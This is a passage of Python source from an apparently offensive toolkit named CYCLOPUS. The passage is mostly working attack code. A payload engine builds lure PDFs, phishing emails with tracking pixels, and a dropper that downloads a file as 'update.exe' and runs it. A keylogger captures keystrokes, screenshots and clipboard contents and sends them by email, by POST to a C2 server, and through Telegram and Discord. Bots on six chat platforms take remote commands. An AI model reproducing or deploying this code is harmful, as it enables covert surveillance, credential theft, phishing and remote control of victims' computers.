                               f'name=CYCLOPUS_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=CYCLOPUS_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        try:
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    import dns.reversename
                    import dns.resolver
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        return str(answers[0]).rstrip('.')
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain error: {e}")
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        try:
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    import dns.resolver
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        return str(answers[0])
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP error: {e}")
            return None

# =====================
# DEPLOYMENT ENGINE
# =====================
class DeploymentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_pdf_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        pdf_content = f"""
        %PDF-1.4
        1 0 obj
        << /Type /Catalog /Pages 2 0 R >>
        endobj
        2 0 obj
        << /Type /Pages /Kids [3 0 R] /Count 1 >>
        endobj
        3 0 obj
        << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
        endobj
        4 0 obj
        << /Length 200 >>
        stream
        BT
        /F1 24 Tf
        100 700 Td
        (Important Document) Tj
        /F1 12 Tf
        100 650 Td
        (Please click here to view: {keylog_url}) Tj
        ET
        endstream
        endobj
        xref
        0 5
        0000000000 65535 f
        0000000009 00000 n
        0000000054 00000 n
        0000000102 00000 n
        0000000200 00000 n
        trailer
        << /Size 5 /Root 1 0 R >>
        startxref
        300
        %%EOF
        """
        
        pdf_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.pdf")
        with open(pdf_path, 'w') as f:
            f.write(pdf_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="pdf",
            payload=pdf_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_email_payload(self, name: str, target: str, subject: str, body: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        email_content = f"""
        Subject: {subject}
        From: security@{self.config.get('spear_phishing.smtp_username', '').split('@')[-1] or 'example.com'}
        To: {target}
        Content-Type: text/html
        
        <html>
        <body>
        {body}
        <br><br>
        <a href="{keylog_url}">Click here to view the document</a>
        <br><br>
        <img src="{keylog_url}/tracking.gif" width="1" height="1">
        </body>
        </html>
        """
        
        email_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.eml")
        with open(email_path, 'w') as f:
            f.write(email_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="email",
            payload=email_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_link_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                keylog_url = s.tinyurl.short(keylog_url)
            except:
                pass
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="link",
            payload=keylog_url,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_executable_payload(self, name: str, target: str, keylog_server: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        exe_content = f'''
import os
import sys
import subprocess
import requests
import platform
import base64

def download_and_execute(url):
    try:
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            temp_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'update.exe')
            with open(temp_path, 'wb') as f:
                f.write(response.content)
            os.chmod(temp_path, 0o755)
            subprocess.Popen([temp_path], shell=True)
    except:
        pass

if __name__ == "__main__":
    download_and_execute("{keylog_server}/download")
'''
        
        exe_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.py")
        with open(exe_path, 'w') as f:
            f.write(exe_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="executable",
            payload=exe_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_docx_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        docx_content = f"""
        Important Document

        Please click the link below to view the document:

        {keylog_url}
        """
        
        docx_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.docx")
        with open(docx_path, 'w') as f:
            f.write(docx_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="docx",
            payload=docx_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def get_deployments(self) -> List[Dict]:
        return self.db.get_deployments()
    
    def track_opened(self, deployment_id: str):
        self.db.update_deployment_status(deployment_id, opened=True)
        logger.info(f"Deployment {deployment_id} opened")
    
    def track_executed(self, deployment_id: str):
        self.db.update_deployment_status(deployment_id, executed=True)
        logger.info(f"Deployment {deployment_id} executed")

# =====================
# KEYLOGGER ENGINE
# =====================
class KeyloggerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
        self.telegram_bot = None
        self.discord_bot = None
        self.session_id = str(uuid.uuid4())[:8]
        self.hostname = socket.gethostname()
    
    def start(self):
        if not PYNPUT_AVAILABLE:
            print(f"{Colors.RED}❌ Pynput not available. Install with: pip install pynput{Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.GREEN}✅ Advanced Keylogger started{Colors.RESET}")
            print(f"{Colors.CYAN}  • Press {self.config.get('keylogger.hotkey', 'F10')} to stop{Colors.RESET}")
            print(f"{Colors.CYAN}  • Screenshot interval: {self.screenshot_interval}s{Colors.RESET}")
            print(f"{Colors.CYAN}  • Upload interval: {self.upload_interval}s{Colors.RESET}")
            print(f"{Colors.CYAN}  • Clipboard capture: {'Enabled' if self.capture_clipboard else 'Disabled'}{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.RED}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.GREEN}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self._update_window_info()
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
                
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _update_window_info(self):
        try:
            import pygetwindow as gw
            active = gw.getActiveWindow()
            if active:
                self.current_window = active.title
                self.current_process = active.title[:100]
        except:
            pass
    
    def _save_keylog(self):
        if self.text:
            timestamp = datetime.datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.log_keylog(self.text, self.session_id, self.current_process, self.hostname, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            self._exfiltrate_data(self.text, screenshot_path)
            
            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        try:
            import pyautogui
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_EXFIL_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
                elif method == "telegram":
                    self._exfil_telegram(text, screenshot_path)
                elif method == "discord":
                    self._exfil_discord(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        try:
            smtp_server = self.config.get('spear_phishing.smtp_server', '')
            smtp_port = self.config.get('spear_phishing.smtp_port', 587)
            smtp_username = self.config.get('spear_phishing.smtp_username', '')
            smtp_password = self.config.get('spear_phishing.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfil_telegram(self, text: str, screenshot_path: str):
        try:
            if self.telegram_bot:
                self.telegram_bot.send_message(f"🐙 Keylog Data:\n\n{text[:3000]}")
                if screenshot_path:
                    self.telegram_bot.send_photo(screenshot_path)
        except:
            pass
    
    def _exfil_discord(self, text: str, screenshot_path: str):
        try:
            if self.discord_bot:
                self.discord_bot.send_message(f"🐙 Keylog Data:\n```\n{text[:1900]}\n```")
                if screenshot_path:
                    self.discord_bot.send_file(screenshot_path)
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit, self.session_id)
    
    def get_screenshots(self) -> List[str]:
        try:
            return [f for f in os.listdir(KEYLOG_EXFIL_DIR) if f.startswith('screenshot_')]
        except:
            return []
    
    def set_telegram_bot(self, bot):
        self.telegram_bot = bot
    
    def set_discord_bot(self, bot):
        self.discord_bot = bot

# =====================
# PLATFORM BOTS
# =====================

class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "discord_config.json")):
                with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.PURPLE}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(
                    title="🐙 CYCLOPUS-BOT-V1 Response",
                    description=f"```{output}```",
                    color=0x00d4ff
                )
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
    
    def send_message(self, text: str):
        try:
            if self.bot and self.running:
                channel = self.bot.get_channel(int(self.config.get('channel_id', 0)))
                if channel:
                    asyncio.run_coroutine_threadsafe(channel.send(text), self.bot.loop)
        except:
            pass
    
    def send_file(self, file_path: str):
        try:
            if self.bot and self.running and os.path.exists(file_path):
                channel = self.bot.get_channel(int(self.config.get('channel_id', 0)))
                if channel:
                    asyncio.run_coroutine_threadsafe(channel.send(file=discord.File(file_path)), self.bot.loop)
        except:
            pass

class TelegramBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "telegram_config.json")):
                with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not TELETHON_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('cyclopus_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.BLUE}✅ Telegram bot connected{Colors.RESET}")
                self.running = True
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```\n_Time: {result.get('execution_time', 0):.2f}s_")
                
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
    
    def send_message(self, text: str):
        try:
            if self.client and self.running:
                asyncio.run_coroutine_threadsafe(
                    self.client.send_message(self.config['chat_id'], text[:4000]),
                    self.client.loop
                )
        except:
            pass
    
    def send_photo(self, photo_path: str):
        try:
            if self.client and self.running and os.path.exists(photo_path):
                asyncio.run_coroutine_threadsafe(
                    self.client.send_file(self.config['chat_id'], photo_path),
                    self.client.loop
                )
        except:
            pass

class SlackBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "slack_config.json")):
                with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE:
            return False
        if not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        last_ts = {}
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            ts = msg.get('ts')
                            if last_ts.get(channel) != ts:
                                last_ts[channel] = ts
                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
                                )
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def send_message(self, text: str):
        try:
            if self.client:
                self.client.chat_postMessage(
                    channel=self.config.get('channel_id', 'general'),
                    text=text[:4000]
                )
        except:
            pass

class SignalBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "signal_config.json")):
                with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE and self.config.get('phone_number')
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        while self.running:
            try:
                result = subprocess.run(
                    ['signal-cli', 'receive', '--number', self.config['phone_number']],
                    capture_output=True, text=True, timeout=30
                )
                
                if result.stdout:
                    for line in result.stdout.splitlines():
                        if line.startswith('Message:'):
                            msg = line.replace('Message:', '').strip()
                            if msg.startswith(self.config.get('prefix', '!')):
                                cmd = msg[1:].strip()
                                resp = self.handler.execute(cmd, 'signal', 'signal_user')
                                self._send_message(resp.get('output', ''))
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _send_message(self, text: str):
        try:
            cmd = ['signal-cli', 'send', '--number', self.config['phone_number']]
            if self.config.get('group_id'):
                cmd.extend(['--group', self.config['group_id']])
            cmd.extend(['--message', text[:4000]])
            subprocess.run(cmd, capture_output=True, timeout=10)
        except:
            pass
    
    def send_message(self, text: str):
        self._send_message(text)

class GoogleChatBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "googlechat_config.json")):
                with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
    
    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return self.config.get('webhook_url') is not None
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        try:
            data = {'text': text[:4000]}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.config['webhook_url'], json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False

class WhatsAppBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "whatsapp_config.json")):
                with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return WHATSAPP_AVAILABLE and self.config.get('phone_number')
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        try:
            import pywhatkit
            pywhatkit.sendwhatmsg_instantly(self.config['phone_number'], text[:4000])
            return True
        except:
            return False

class iMessageBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "imessage_config.json")):
                with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
    
    def save_config(self, phone_numbers: List[str], enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'phone_numbers': phone_numbers, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return IMESSAGE_AVAILABLE and self.config.get('phone_numbers')
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
    
    def _run(self):
        if not IMESSAGE_AVAILABLE:
            logger.error("iMessage only available on macOS")
            return
        
        while self.running:
            try:
                self._monitor_messages()
                time.sleep(5)
            except:
                time.sleep(10)
    
    def _monitor_messages(self):
        try:
            script = """
            tell application "Messages"
                set recentMessages to every message of chat 1
                repeat with msg in recentMessages
                    if msg is not read then
                        set msgText to content of msg
                        set msgSender to handle of sender of msg
                    end if
                end repeat
            end tell
            """
            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
            
            if result.stdout:
                for line in result.stdout.splitlines():
                    if line.startswith('!'):
                        cmd = line[1:].strip()
                        resp = self.handler.execute(cmd, 'imessage', 'imessage_user')
                        self._send_message(resp.get('output', ''))
        except:
            pass
    
    def _send_message(self, text: str):
        try:
            for phone in self.config['phone_numbers']:
                script = f'''
                tell application "Messages"
                    set targetService to 1st service whose service type = iMessage
                    set targetBuddy to buddy "{phone}" of targetService
                    send "{text[:4000]}" to targetBuddy
                end tell
                '''
                subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
        except:
            pass
    
    def send_message(self, text: str, phone: str = None):
        self._send_message(text)

# =====================
# PLATFORM COMMAND EXECUTOR
# =====================
class PlatformCommandExecutor:
    """Handles command execution across multiple platforms"""
    
    def __init__(self, handler: 'CommandHandler', config: ConfigManager):
        self.handler = handler
        self.config = config
        self.platforms = {}
        self.is_running = False
        self.executor_pool = ThreadPoolExecutor(max_workers=10)
        self.command_queue = queue.Queue()
        self.results = {}
        self.db = None
    
    def register_platform(self, name: str, bot_instance):
        """Register a platform bot for command execution"""
        self.platforms[name] = bot_instance
        print(f"{Colors.CYAN}✅ Platform '{name}' registered for command execution{Colors.RESET}")
    
    def execute_on_platform(self, platform: str, command: str, user_id: str = None) -> Dict:
        """Execute a command on a specific platform"""
        if platform not in self.platforms:
            return {'success': False, 'error': f'Platform {platform} not registered'}
        
        bot = self.platforms[platform]
        if not bot.running:
            return {'success': False, 'error': f'Platform {platform} is not running'}
        
        try:
            result = self.handler.execute(command, platform, user_id)
            if self.db:
                self.db.log_platform_command(platform, command, user_id)
            return result
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def execute_on_all_platforms(self, command: str, user_id: str = None) -> Dict:
        """Execute a command on all registered platforms"""
        results = {}
        for platform, bot in self.platforms.items():
            if bot.running:
                results[platform] = self.execute_on_platform(platform, command, user_id)
        return results
    
    def queue_command(self, platform: str, command: str, user_id: str = None):
        """Queue a command for execution"""
        self.command_queue.put({
            'platform': platform,
            'command': command,
            'user_id': user_id
        })
        return {'success': True, 'message': 'Command queued for execution'}
    
    def start_processor(self):
        """Start the command processor thread"""
        if self.is_running:
            return
        
        self.is_running = True
        threading.Thread(target=self._process_queue, daemon=True).start()
        print(f"{Colors.CYAN}✅ Platform command processor started{Colors.RESET}")
    
    def _process_queue(self):
        """Process queued commands"""
        while self.is_running:
            try:
                item = self.command_queue.get(timeout=1)
                if item:
                    result = self.execute_on_platform(
                        item['platform'],
                        item['command'],
                        item['user_id']
                    )
                    self.results[item.get('id', str(time.time()))] = result
            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Queue processor error: {e}")
    
    def stop_processor(self):
        """Stop the command processor"""
        self.is_running = False
        self.executor_pool.shutdown(wait=False)
        print(f"{Colors.YELLOW}⏹️ Platform command processor stopped{Colors.RESET}")
    
    def get_results(self, limit: int = 50) -> List[Dict]:
        """Get recent command results"""
        results = []
        for key, value in list(self.results.items())[-limit:]:
            results.append({'id': key, 'result': value})
        return results

# =====================
# SPEAR PHISHING ENGINE
# =====================
class SpearPhishingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_campaign(self, name: str, template: str, subject: str, from_email: str,
                       targets: List[Dict], scheduled_time: str = None) -> Dict:
        campaign_id = str(uuid.uuid4())[:8]
        
        campaign_data = {
            'id': campaign_id,
            'name': name,
            'template': template,
            'subject': subject,
            'from_email': from_email,
            'targets': targets,
